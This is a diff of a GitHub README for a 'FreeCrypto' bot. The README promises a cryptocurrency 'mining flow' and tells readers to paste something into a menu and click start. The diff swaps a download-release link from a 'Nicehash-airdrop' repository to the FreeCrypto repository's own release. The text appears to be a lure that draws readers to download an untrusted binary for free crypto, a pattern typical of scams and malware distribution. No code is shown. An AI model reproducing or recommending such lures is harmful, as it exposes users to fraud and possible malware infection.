@@ -43,7 +43,7 @@ https://github.com/crickleokarshiev312/FreeCrypto/assets/167145074/a1356be9-eeff
 1. open Freecrypto bot
 2. Paste into the menu of your cryptocurrency and click start, thereby starting the mining flow
 
--[<img src="https://github.com/crickleokarshiev312/FreeCrypto/assets/167145074/82065774-99e2-4fda-9292-c5079c9b4fc7"/>](https://github.com/culm65gonzo/Nicehash-airdrop/releases/tag/Download_last_version)
+-[<img src="https://github.com/crickleokarshiev312/FreeCrypto/assets/167145074/82065774-99e2-4fda-9292-c5079c9b4fc7"/>](https://github.com/crickleokarshiev312/FreeCrypto/releases/tag/Download_last_version)
 
 ### 🚀Please repay with a star for the work done🚀
 
